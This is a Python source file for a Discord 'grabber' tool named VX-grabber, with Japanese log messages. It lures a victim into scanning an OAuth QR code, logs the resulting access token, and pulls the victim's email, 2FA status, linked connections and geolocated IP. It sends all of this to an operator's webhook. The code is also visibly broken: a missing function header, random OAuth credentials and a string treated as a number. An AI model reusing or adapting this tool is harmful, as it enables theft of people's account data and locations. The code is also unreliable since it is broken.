import os
import time
import requests
import random
import string
from datetime import datetime
from PIL import Image, ImageDraw
import qrcode
import json
import threading
import socket
import platform
import uuid
import subprocess
import sys
import urllib.parse
from flask import Flask, request, redirect
import webbrowser
import base64
    
    art = f"""
__   __   __     ____  __                  _     _               
\ \  \ \  \ \   / /\ \/ /   __ _ _ __ __ _| |__ | |__   ___ _ __ 
 \ \  \ \  \ \ / /  \  /   / _` | '__/ _` | '_ \| '_ \ / _ \ '__|
 / /  / /   \ V /   /  \  | (_| | | | (_| | |_) | |_) |  __/ |   
/_/  /_/     \_/   /_/\_\  \__, |_|  \__,_|_.__/|_.__/ \___|_|   
                           |___/                                 

"""
    print(art)

def clear_cmd_logs():
    if platform.system() == "Windows":
        subprocess.run("cls", shell=True)
    else:
        subprocess.run("clear", shell=True)

def log(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    print(log_entry)
    with open("grabber_log.txt", "a") as f:
        f.write(log_entry + "\n")

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def start_discord_oauth():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/login"
    }
    
    client_data = {
        "client_id": f"{random.randint(100000000000000000, 999999999999999999)}",
        "client_secret": generate_random_string(32),
        "redirect_uri": "http://localhost:8080/callback",
        "scope": "identify email connections guilds"
    }
    

    auth_url = f"https://discord.com/oauth2/authorize?client_id={client_data['client_id']}&redirect_uri={urllib.parse.quote(client_data['redirect_uri'])}&response_type=code&scope={client_data['scope']}"
    
    return auth_url, client_data

def save_qr_image(qr_code_data, filename):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(qr_code_data)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    
    if not os.path.exists("QRcode"):
        os.makedirs("QRcode")
    
    qr_path = f"QRcode/{filename}.png"
    img.save(qr_path)
    
    return qr_path

def get_token_info(auth_code, client_data):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/login"
    }
    
    token_data = {
        "client_id": client_data["client_id"],
        "client_secret": client_data["client_secret"],
        "grant_type": "authorization_code",
        "code": auth_code,
        "redirect_uri": client_data["redirect_uri"]
    }
    
    response = requests.post(
        "https://discord.com/api/oauth2/token",
        headers=headers,
        data=token_data
    )
    
    if response.status_code == 200:
        token_data = response.json()
        return token_data
    else:
        log(f"[-] トークン取得エラー: {response.status_code}")
        return None

def get_user_info(token):
    headers = {
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me"
    }
    
    response = requests.get("https://discord.com/api/users/@me", headers=headers)
    
    if response.status_code == 200:
        user_data = response.json()
        
       
        connections_response = requests.get("https://discord.com/api/users/@me/connections", headers=headers)
        
        if connections_response.status_code == 200:
            connections_data = connections_response.json()
            user_data["connections"] = connections_data
        
        return user_data
    else:
        log(f"[-] ユーザー情報取得エラー: {response.status_code}")
        return None

def send_to_webhook(webhook_url, user_info):
    embed = {
        "title": "account",
        "description": f"name: {user_info['username']}#{user_info['discriminator']}\nID: {user_info['id']}",
        "color": 0x7289da,
        "fields": [
            {
                "name": "email",
                "value": user_info.get("email", "none"),
                "inline": True
            },
            {
                "name": "verified",
                "value": "true" if user_info.get("verified", False) else "false",
                "inline": True
            },
            {
                "name": "2FA",
                "value": "true" if user_info.get("mfa_enabled", False) else "false",
                "inline": True
            },
            {
                "name": "make",
                "value": f"<t:{int(user_info.get('id', 0) / 4194304000 + 1420070400)}:R>",
                "inline": True
            },
            {
                "name": "nitro",
                "value": "true" if user_info.get("premium_type", 0) > 0 else "false",
                "inline": True
            }
        ],
        "footer": {
            "text": "VX-grabber",
            "icon_url": "https://cdn.discordapp.com/attachments/1510630591605903512/1510634591013310474/vx.png"
        },
        "thumbnail": {
            "url": f"https://cdn.discordapp.com/avatars/{user_info.get('id', '0')}/{user_info.get('avatar', '0')}.png"
        }
    }
    
   
    try:
        ip_response = requests.get("https://api.ipify.org?format=json")
        if ip_response.status_code == 200:
            ip_data = ip_response.json()
            embed["fields"].append({
                "name": "IP",
                "value": ip_data["ip"],
                "inline": True
            })
            
            
            try:
                geo_response = requests.get(f"https://ipapi.co/{ip_data['ip']}/json/")
                if geo_response.status_code == 200:
                    geo_data = geo_response.json()
                    embed["fields"].append({
                        "name": "位置情報",
                        "value": f"{geo_data.get('city', 'none')}, {geo_data.get('region', 'none')}, {geo_data.get('country_name', 'none')}",
                        "inline": True
                    })
                    
                    embed["fields"].append({
                        "name": "座標",
                        "value": f"緯度: {geo_data.get('latitude', 'none')}, 経度: {geo_data.get('longitude', 'none')}",
                        "inline": True
                    })
            except:
                pass
    except:
        pass
    
    payload = {
        "embeds": [embed],
        "username": "VX-grabber",
        "avatar_url": "https://cdn.discordapp.com/attachments/1510630591605903512/1510634591013310474/vx.png"
    }
    
    response = requests.post(webhook_url, json=payload)
    
    if response.status_code == 204:
        log("[+] Webhookに送信成功")
        return True
    else:
        log(f"[-] Webhook送信エラー: {response.status_code}")
        return False

app = Flask(__name__)
auth_code = None
client_data = None
webhook_url_global = None

@app.route('/callback')
def callback():
    global auth_code, client_data, webhook_url_global
    
  
    code = request.args.get('code')
    if code:
        auth_code = code
        log(f"[+] 認証コード取得成功: {code}")
        
       
        token_info = get_token_info(auth_code, client_data)
        
        if token_info and "access_token" in token_info:
            token = token_info["access_token"]
            log(f"[+] トークン取得成功: {token}")
            

            user_info = get_user_info(token)
            
            if user_info:
                log(f"[+] ユーザー情報取得成功: {user_info.get('username', '不明')}#{user_info.get('discriminator', '不明')}")
                
              
                send_to_webhook(webhook_url_global, user_info)
                
                return redirect("https://discord.com/app")
            else:
                log("[-] ユーザー情報取得失敗")
                return redirect("https://discord.com/app")
        else:
            log("[-] トークン取得失敗")
            return redirect("https://discord.com/app")
    else:
        log("[-] 認証コード取得失敗")
        return redirect("https://discord.com/app")


def check_qr_expiry(start_time):
    global auth_code
    
    timeout = 120  
    elapsed = 0
    
    while elapsed < timeout and auth_code is None:
        elapsed = time.time() - start_time
        time.sleep(1)  
    
    if auth_code is None:
        log("[-] QRコードの有効期限切れ")
        return False
    else:
        return True


def main():
    global client_data, webhook_url_global
    
    clear_cmd_logs()
    
   
    print_ascii_art()
    
  
    webhook_url_global = input("Webhook URLを入力してください: ")
    
    if not webhook_url_global:
        log("[-] Webhook URLが入力されていません")
        return
    

    log("[+] QRコード生成中...")
    auth_url, client_data = start_discord_oauth()
    
    if not auth_url:
        log("[-] 認証URL生成失敗")
        return
    
 
    qr_path = save_qr_image(auth_url, "discord_qr")
    
    log(f"[+] QRコード生成成功: {qr_path}")
    log(f"[+] URL: {auth_url}")
    
    
    server_thread = threading.Thread(target=lambda: app.run(host='localhost', port=8080, debug=False))
    server_thread.daemon = True
    server_thread.start()
    
    log("[待機中]")
    start_time = time.time()
    
    if check_qr_expiry(start_time):
        log("[+] トークン取得と送信完了")
    else:
        log("[-] トークン取得失敗")
        
       
        log("[+] 新しいQRコードを生成します...")
        main()  

if __name__ == "__main__":
    main()